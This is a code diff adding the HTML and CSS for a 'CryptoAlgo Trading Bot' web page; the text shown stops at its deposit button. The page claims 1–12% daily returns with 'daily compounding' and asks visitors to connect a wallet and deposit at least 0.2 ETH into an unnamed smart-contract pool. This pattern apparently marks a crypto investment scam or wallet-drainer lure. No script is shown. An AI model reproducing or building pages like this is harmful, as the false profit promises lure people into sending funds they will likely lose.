@@ -1,0 +1,1376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoAlgo Trading Bot</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: #0d1117;
+            color: #e6edf3;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .container {
+            background: linear-gradient(135deg, #161b22 0%, #1a1f26 100%);
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3), 0 2px 8px rgba(88, 166, 255, 0.1);
+            border: 1px solid #30363d;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(88, 166, 255, 0.3), transparent);
+        }
+        
+        h1 {
+            background: linear-gradient(135deg, #58a6ff 0%, #00bfae 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-top: 0;
+            text-align: center;
+            font-size: 2.3rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #a3aab5;
+            margin-top: -8px;
+            margin-bottom: 32px;
+            font-size: 1.05rem;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .card {
+            background: linear-gradient(135deg, #21262d 0%, #252c35 100%);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(48, 54, 61, 0.8);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, rgba(88, 166, 255, 0.5), rgba(0, 191, 174, 0.5));
+            transform: scaleX(0);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.25), 0 2px 8px rgba(88, 166, 255, 0.15);
+        }
+        
+        .card:hover::before {
+            transform: scaleX(1);
+        }
+        
+        .card-title {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            color: #a3aab5;
+            margin-bottom: 8px;
+            font-weight: 600;
+            letter-spacing: 0.8px;
+        }
+        
+        .card-value {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #58a6ff;
+            display: flex;
+            align-items: center;
+            line-height: 1.2;
+            letter-spacing: -0.2px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #c9d1d9;
+            font-weight: 600;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid rgba(48, 54, 61, 0.8);
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+            color: #e6edf3;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #58a6ff;
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1), 0 2px 8px rgba(88, 166, 255, 0.15);
+            transform: translateY(-1px);
+        }
+        
+        button {
+            background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(35, 134, 54, 0.3);
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.5s;
+        }
+        
+        button:hover {
+            background: linear-gradient(135deg, #2ea043 0%, #34d058 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(35, 134, 54, 0.4);
+        }
+        
+        button:hover::before {
+            left: 100%;
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button:disabled {
+            background-color: #484f58;
+            cursor: not-allowed;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .status.info {
+            background-color: #0d1d35;
+            color: #58a6ff;
+            border: 1px solid #1f6feb;
+        }
+        
+        .status.success {
+            background-color: #0f2a1a;
+            color: #4a9d5c;
+            border: 1px solid #238636;
+        }
+        
+        .status.error {
+            background-color: #3d1a1a;
+            color: #f85149;
+            border: 1px solid #da3633;
+        }
+        
+        .wallet-info {
+            background: linear-gradient(135deg, #0d1d35 0%, #1a2332 100%);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(31, 111, 235, 0.3);
+            border-left: 4px solid #1f6feb;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 16px rgba(31, 111, 235, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .wallet-info:hover {
+            box-shadow: 0 6px 20px rgba(31, 111, 235, 0.2);
+        }
+        
+        .address {
+            font-size: 14px;
+            word-break: break-all;
+            font-family: monospace;
+            color: #58a6ff;
+        }
+        
+        .chart {
+            width: 100%;
+            height: 100px;
+            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+            margin-top: 0;
+            position: relative;
+            overflow: hidden;
+            border-radius: 5px;
+            border: 1px solid #21262d;
+        }
+        
+        .chart::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                repeating-linear-gradient(
+                    to right,
+                    transparent,
+                    transparent 25px,
+                    rgba(88, 166, 255, 0.08) 25px,
+                    rgba(88, 166, 255, 0.08) 26px
+                ),
+                repeating-linear-gradient(
+                    to bottom,
+                    transparent,
+                    transparent 20px,
+                    rgba(88, 166, 255, 0.05) 20px,
+                    rgba(88, 166, 255, 0.05) 21px
+                );
+            z-index: 1;
+        }
+        
+        .live-chart-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+        }
+        
+        .volatility-overlay {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #58a6ff;
+            background: rgba(13, 17, 23, 0.8);
+            backdrop-filter: blur(4px);
+            padding: 4px 8px;
+            border-radius: 6px;
+            border: 1px solid rgba(88, 166, 255, 0.2);
+            z-index: 10;
+        }
+        
+        .bot-controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .strategy-section {
+            background: linear-gradient(135deg, #21262d 0%, #252c35 100%);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(48, 54, 61, 0.8);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .strategy-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(88, 166, 255, 0.4), transparent);
+        }
+        
+        .strategy-section.disabled {
+            background-color: #161b22;
+            opacity: 0.5;
+            pointer-events: none;
+            border: 1px solid #21262d;
+        }
+        
+        .strategy-section.disabled * {
+            color: #484f58 !important;
+        }
+        
+        .strategy-title {
+            font-size: 1.25rem;
+            color: #e6edf3;
+            margin-top: 0;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+        
+        .strategy-title i {
+            margin-right: 10px;
+            color: #58a6ff;
+            font-size: 1.1em;
+        }
+        
+        .profit-section {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 16px 20px;
+            background: linear-gradient(135deg, rgba(74, 157, 92, 0.08) 0%, rgba(0, 191, 174, 0.08) 100%);
+            border-radius: 12px;
+            border: 1px solid rgba(74, 157, 92, 0.2);
+            position: relative;
+        }
+        
+        .profit-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(74, 157, 92, 0.4), transparent);
+        }
+        
+        .profit-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4a9d5c 0%, #00bfae 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin: 8px 0;
+            letter-spacing: -0.4px;
+            animation: profitGlow 3s ease-in-out infinite;
+        }
+        
+        @keyframes profitGlow {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.1); }
+        }
+        
+        .profit-label {
+            color: #8b949e;
+            font-size: 0.85rem;
+            margin-bottom: 4px;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-left: 12px;
+            vertical-align: middle;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+        }
+        
+        .badge.active {
+            background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
+            color: white;
+            box-shadow: 0 2px 8px rgba(35, 134, 54, 0.3);
+        }
+        
+        .status-details {
+            margin-top: 14px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            background: rgba(13, 17, 23, 0.4);
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid rgba(48, 54, 61, 0.3);
+        }
+        
+        .status-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex: 1;
+            min-width: 0;
+            min-height: 48px;
+        }
+        
+        .status-item:first-child {
+            flex: 1.2;
+        }
+        
+        .status-item:not(:last-child) {
+            border-right: 1px solid rgba(48, 54, 61, 0.4);
+            padding-right: 8px;
+            margin-right: 8px;
+        }
+        
+        .status-label {
+            color: #8b949e;
+            font-weight: 500;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+            white-space: nowrap;
+        }
+        
+        .status-time {
+            color: #58a6ff;
+            font-weight: 600;
+            font-size: 0.8rem;
+            white-space: nowrap;
+        }
+        
+        .status-network {
+            color: #7ee787;
+            font-weight: 600;
+            font-size: 0.8rem;
+            background: rgba(126, 231, 135, 0.12);
+            padding: 4px 8px;
+            border-radius: 6px;
+            border: 1px solid rgba(126, 231, 135, 0.25);
+            white-space: nowrap;
+        }
+        
+        .liquidity-status {
+            color: #00bfae;
+            font-weight: 600;
+            font-size: 0.8rem;
+            white-space: nowrap;
+        }
+        
+        .disconnect-button {
+            background: transparent !important;
+            border: 1px solid #f85149 !important;
+            color: #f85149 !important;
+            padding: 8px 16px !important;
+            font-size: 12px !important;
+            border-radius: 6px !important;
+            cursor: pointer !important;
+            transition: all 0.3s ease !important;
+            width: auto !important;
+            white-space: nowrap !important;
+            box-shadow: none !important;
+        }
+        
+        .disconnect-button:hover {
+            background-color: rgba(248, 81, 73, 0.1) !important;
+            border-color: #f85149 !important;
+            color: #f85149 !important;
+            transform: none !important;
+            box-shadow: 0 0 0 2px rgba(248, 81, 73, 0.2) !important;
+        }\n        \n        .disconnect-button::before {\n            display: none !important;\n        }
+        
+        .wallet-info-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .address-container {
+            max-width: 80%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .min-note {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 5px;
+        }
+        
+        .validation-message {
+            font-size: 12px;
+            margin-top: 5px;
+            padding: 8px;
+            border-radius: 4px;
+            display: none;
+        }
+        
+        .validation-message.error {
+            color: #f85149;
+            background-color: rgba(248, 81, 73, 0.1);
+            border: 1px solid rgba(248, 81, 73, 0.2);
+        }
+        
+        .loading-indicator {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(88, 166, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #58a6ff;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to {transform: rotate(360deg);}
+        }
+        
+        /* Trading logs styling */
+        .trading-logs-section {
+            background: linear-gradient(135deg, #0d1117 0%, #11161d 100%);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 32px;
+            border: 1px solid rgba(48, 54, 61, 0.8);
+            max-height: 320px;
+            overflow-y: auto;
+            display: none; /* Hidden by default */
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .logs-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+        }
+
+        .logs-title {
+            font-size: 1.1rem;
+            color: #58a6ff;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+
+        .logs-title i {
+            margin-right: 10px;
+        }
+        
+        .active-exchanges {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        
+        .exchanges-label {
+            font-size: 0.8rem;
+            color: #8b949e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+        
+        .exchanges-list {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            justify-content: flex-end;
+        }
+        
+        .exchange-badge {
+            background-color: rgba(88, 166, 255, 0.1);
+            color: #58a6ff;
+            border: 1px solid rgba(88, 166, 255, 0.2);
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+        
+        @media (max-width: 768px) {
+            .logs-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .active-exchanges {
+                align-items: flex-start;
+                margin-top: 10px;
+            }
+            
+            .exchanges-list {
+                justify-content: flex-start;
+            }
+        }
+
+        .log-entry {
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 8px;
+            font-family: monospace;
+            font-size: 0.9rem;
+            border-left: 3px solid;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .log-entry.buy {
+            background-color: rgba(56, 139, 253, 0.1);
+            border-left-color: #58a6ff;
+        }
+
+        .log-entry.sell {
+            background-color: rgba(246, 97, 81, 0.1);
+            border-left-color: #f85149;
+        }
+
+        .log-entry.profit {
+            background-color: rgba(46, 160, 67, 0.1);
+            border-left-color: #2ea043;
+        }
+        
+        .log-entry.system {
+            background-color: rgba(139, 148, 158, 0.1);
+            border-left-color: #8b949e;
+        }
+
+        .timestamp {
+            color: #8b949e;
+            font-size: 0.8rem;
+            margin-right: 8px;
+        }
+
+        .total-profit-section {
+            background: linear-gradient(135deg, #21262d 0%, #252c35 100%);
+            border-radius: 16px;
+            padding: 28px;
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid rgba(48, 54, 61, 0.8);
+            display: none; /* Hidden by default */
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        
+
+        .profit-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .total-profit-label {
+            font-size: 0.9rem;
+            color: #8b949e;
+        }
+
+        .total-profit-value {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #4a9d5c;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            letter-spacing: 0.005em;
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        
+        .total-profit-eth {
+            min-width: 120px;
+            text-align: left;
+        }
+        
+        .total-profit-usd {
+            font-size: 1rem;
+            font-weight: 400;
+            color: #8b949e;
+            white-space: nowrap;
+        }
+        
+        .capital-row {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            width: 100%;
+        }
+        
+        .capital-info {
+            flex: 1;
+        }
+        
+        .capital-label {
+            font-size: 0.8rem;
+            color: #8b949e;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .capital-value {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #58a6ff;
+        }
+        
+        .capital-usd {
+            font-size: 0.9rem;
+            color: #8b949e;
+            font-weight: 500;
+        }
+        
+        .profit-arrow {
+            color: #8b949e;
+            font-size: 1.2rem;
+            opacity: 0.7;
+            margin: 0 10px;
+        }
+        
+        .profit-info-main {
+            flex: 1.5;
+        }
+        
+        @media (max-width: 768px) {
+            .capital-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+            
+            .profit-arrow {
+                transform: rotate(90deg);
+                margin: 0;
+            }
+            
+            .profit-info-main, .capital-info {
+                width: 100%;
+            }
+        }
+
+        .withdraw-button {
+            background: linear-gradient(135deg, #58a6ff 0%, #1f6feb 100%);
+            padding: 14px 28px;
+            width: auto;
+            font-size: 15px;
+            font-weight: 600;
+            box-shadow: 0 4px 16px rgba(88, 166, 255, 0.3);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .withdraw-button:hover {
+            background: linear-gradient(135deg, #1f6feb 0%, #0969da 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(88, 166, 255, 0.4);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.05); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        
+        /* Modal styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .modal {
+            background-color: #161b22;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 520px;
+            border: 1px solid #30363d;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+        }
+        
+        .modal-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid #30363d;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #21262d;
+        }
+        
+        .modal-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #c9d1d9;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .modal-title i {
+            color: #58a6ff;
+        }
+        
+        .modal-close {
+            background: none !important;
+            background-color: transparent !important;
+            border: none !important;
+            color: #8b949e !important;
+            font-size: 1.5rem;
+            cursor: pointer;
+            width: auto !important;
+            padding: 0 !important;
+            line-height: 1;
+            box-shadow: none !important;
+            transform: none !important;
+        }\n        \n        .modal-close:hover {\n            color: #c9d1d9 !important;\n            background: none !important;\n            background-color: transparent !important;\n            box-shadow: none !important;\n            transform: none !important;\n        }\n        \n        .modal-close::before {\n            display: none !important;\n        }
+        
+        .modal-body {
+            padding: 24px;
+            background-color: #161b22;
+        }
+        
+        .modal-footer {
+            padding: 20px 24px;
+            border-top: 1px solid #30363d;
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            background-color: #21262d;
+        }
+        
+        .modal-footer button {
+            width: auto;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-weight: 500;
+        }
+        
+        .modal-footer .modal-cancel,
+        #modalCancel {
+            background: #8b949e !important;
+            background-color: #8b949e !important;
+            border: 1px solid #8b949e !important;
+            color: white !important;
+            transition: all 0.2s ease !important;
+        }\n        \n        button.modal-cancel {\n            background: #8b949e !important;\n            background-color: #8b949e !important;\n        }"
+        
+        .modal-footer .modal-cancel:hover,
+        #modalCancel:hover,
+        button.modal-cancel:hover {
+            background: #a3aab5 !important;
+            background-color: #a3aab5 !important;
+            border-color: #a3aab5 !important;
+            transform: none !important;
+            box-shadow: none !important;
+        }\n        \n        .modal-cancel::before,\n        #modalCancel::before {\n            display: none !important;\n        }"
+        
+        .modal-confirm {
+            background-color: #58a6ff;
+            transition: all 0.2s ease;
+        }
+        
+        .modal-confirm:hover {
+            background-color: #1f6feb;
+        }
+        
+        .fee-note {
+            font-size: 0.9rem;
+            color: #8b949e;
+            margin-top: 20px;
+            padding: 16px;
+            border-radius: 8px;
+            background-color: rgba(88, 166, 255, 0.08);
+            border: 1px solid rgba(88, 166, 255, 0.2);
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        
+        .fee-note i {
+            color: #58a6ff;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+        
+        .withdrawal-details {
+            background-color: #0d1117;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #21262d;
+        }
+        
+        .withdrawal-detail {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            padding: 0 4px;
+        }
+        
+        .withdrawal-detail:last-child {
+            margin-bottom: 0;
+            padding-top: 14px;
+            border-top: 1px solid #30363d;
+            font-size: 1.05rem;
+        }
+        
+        .detail-label {
+            color: #8b949e;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+        
+        .detail-value {
+            font-weight: 500;
+            color: #a3aab5;
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+        }
+        
+        .detail-value.profit {
+            color: #4a9d5c;
+        }
+        
+        .detail-value.fee {
+            color: #a3aab5;
+        }
+        
+        .detail-value.total {
+            color: #58a6ff;
+            font-size: 1.05rem;
+            font-weight: 600;
+        }
+        
+        .detail-eth {
+            font-weight: 500;
+        }
+        
+        .detail-usd {
+            font-size: 0.85rem;
+            font-weight: 300;
+            color: #8b949e;
+        }
+        
+        
+        /* Toast notification styles */
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #21262d;
+            color: #e6edf3;
+            padding: 16px 20px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 320px;
+            opacity: 0;
+            transform: translateX(100%);
+            transition: all 0.3s ease;
+        }
+        
+        .toast.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        .toast.info {
+            border-left: 4px solid #58a6ff;
+        }
+        
+        .toast.success {
+            border-left: 4px solid #4a9d5c;
+        }
+        
+        .toast.error {
+            border-left: 4px solid #f85149;
+        }
+        
+        .toast-icon {
+            font-size: 18px;
+        }
+        
+        .toast.info .toast-icon {
+            color: #58a6ff;
+        }
+        
+        .toast.success .toast-icon {
+            color: #4a9d5c;
+        }
+        
+        .toast.error .toast-icon {
+            color: #f85149;
+        }
+        
+        .toast-content {
+            flex: 1;
+        }
+        
+        .toast-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        
+        .toast-message {
+            font-size: 14px;
+            color: #8b949e;
+        }
+        
+        .estimated-earnings-card {
+            background: linear-gradient(135deg, #21262d 0%, #252c35 100%);
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin: 20px 0;
+            border: 1px solid rgba(0, 191, 174, 0.3);
+            border-left: 4px solid #00bfae;
+            box-shadow: 0 4px 16px rgba(0, 191, 174, 0.1);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            display: none;
+            position: relative;
+        }
+        
+        .estimated-earnings-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(0, 191, 174, 0.4), transparent);
+        }
+        
+        .estimated-earnings-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(0, 191, 174, 0.2);
+            border-left-color: #58a6ff;
+        }
+        
+        .earnings-title {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            color: #8b949e;
+            margin-bottom: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        
+        .earnings-title i {
+            margin-right: 10px;
+        }
+        
+        .earnings-values {
+            display: flex;
+            align-items: baseline;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .earnings-eth {
+            color: #00bfae;
+            font-size: 1.1rem;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+        }
+        
+        .earnings-usd {
+            color: #5fb370;
+            font-size: 1rem;
+            font-weight: 600;
+            background: rgba(0, 191, 174, 0.1);
+            border-radius: 6px;
+            padding: 4px 10px;
+            border: 1px solid rgba(0, 191, 174, 0.2);
+        }
+        
+        .earnings-volatility {
+            color: #8b949e;
+            font-size: 0.85rem;
+            margin-left: auto;
+            background: rgba(139, 148, 158, 0.1);
+            border-radius: 4px;
+            padding: 2px 8px;
+            border: 1px solid rgba(139, 148, 158, 0.2);
+        }
+        
+        @media (max-width: 600px) {
+            .earnings-values {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+            
+            .earnings-volatility {
+                margin-left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CryptoAlgo Trading Bot</h1>
+        <p class="subtitle">Advanced Ethereum arbitrage & profit maximization</p>
+        
+        <div id="walletInfo" class="wallet-info" style="display: none;">
+            <div class="wallet-info-container">
+                <div>
+                    <label><i class="fas fa-wallet" style="margin-right: 10px;"></i>Connected Wallet:</label>
+                    <div id="walletAddress" class="address"></div>
+                </div>
+            </div>
+            <button id="disconnectWallet" class="disconnect-button"><i class="fas fa-sign-out-alt" style="margin-right: 10px;"></i>Disconnect</button>
+        </div>
+        
+        <div id="connectWalletDiv">
+            <button id="connectWallet"><i class="fas fa-plug" style="margin-right: 10px;"></i>Connect Wallet to Start Trading</button>
+        </div>
+        
+        <div id="tradingDashboard" style="display: none;">
+            <div class="profit-section">
+                <div class="profit-label">Estimated Daily Profit</div>
+                <div id="profitValue" class="profit-value">+5.2%</div>
+                <div>Daily compounding through smart contract liquidity pools</div>
+            </div>
+            
+            <div class="dashboard">
+                <div class="card">
+                    <div class="card-title">Market Volatility</div>
+                    <div class="chart">
+                        <canvas id="liveChart" class="live-chart-canvas"></canvas>
+                        <div id="volatilityValue" class="volatility-overlay">12.4%</div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-title">Bot Status</div>
+                    <div id="botStatusValue" class="card-value">Ready <span class="badge active">ONLINE</span></div>
+                    <div class="status-details">
+                        <div class="status-item">
+                            <span class="status-label">Last Scan:</span>
+                            <span id="lastScan" class="status-time">2 minutes ago</span>
+                        </div>
+                        <div class="status-item">
+                            <span class="status-label">Network:</span>
+                            <span class="status-network">Ethereum</span>
+                        </div>
+                        <div class="status-item">
+                            <span class="status-label">Liquidity:</span>
+                            <span class="liquidity-status">Available</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="tradingAlgorithmSection" class="strategy-section">
+                <h3 class="strategy-title"><i class="fas fa-robot"></i> Trading Algorithm</h3>
+                <p>Our bot uses a combination of MEV protection, frontrunning detection, and cross-DEX arbitrage to maximize returns while minimizing gas costs.</p>
+                
+                <div class="bot-controls">
+                    <div class="input-group">
+                        <label for="strategy">Trading Strategy</label>
+                        <select id="strategy">
+                            <option value="arbitrage">Cross-DEX Arbitrage</option>
+                            <option value="swing">Swing Trading</option>
+                            <option value="grid">Grid Trading</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label for="risk">Risk Level</label>
+                        <select id="risk">
+                            <option value="low">Conservative (1-3% daily)</option>
+                            <option value="medium" selected>Balanced (3-7% daily)</option>
+                            <option value="high">Aggressive (7-12% daily)</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="transferDiv">
+                <div class="strategy-section">
+                    <h3 class="strategy-title"><i class="fas fa-cogs"></i> Activate Trading Bot</h3>
+                    <p>Initialize the trading bot by depositing ETH into the smart contract liquidity pool. The bot will automatically begin executing trades based on your selected strategy.</p>
+                    
+                    <div class="input-group">
+                        <label for="amount">Initial Trading Capital (ETH)</label>
+                        <input type="number" id="amount" step="0.001" min="0.2" placeholder="Min 0.2 ETH">
+                        <div class="min-note">Minimum deposit: 0.2 ETH</div>
+                        <div id="amountValidation" class="validation-message error">Minimum deposit is 0.2 ETH. This ensures sufficient capital to cover transaction fees, slippage, and gas costs while maintaining profitable trades.</div>
+                    </div>
+                    <div id="estimatedEarningsCard" class="estimated-earnings-card">
+                        <div class="earnings-title">
+                            <i class="fas fa-chart-line"></i>Estimated Daily Earnings
+                        </div>
+                        <div class="earnings-values">
+                            <span id="estimatedEarningsEth" class="earnings-eth">0.0000 ETH</span>
+                            <span id="estimatedEarningsUsd" class="earnings-usd">$0.00</span>
+                            <span id="volatilityEarningsNote" class="earnings-volatility"></span>
+                        </div>
+                    </div>
+                    <button id="sendEth"><i class="fas fa-rocket" style="margin-right: 10px;"></i>Initialize Trading Bot</button>
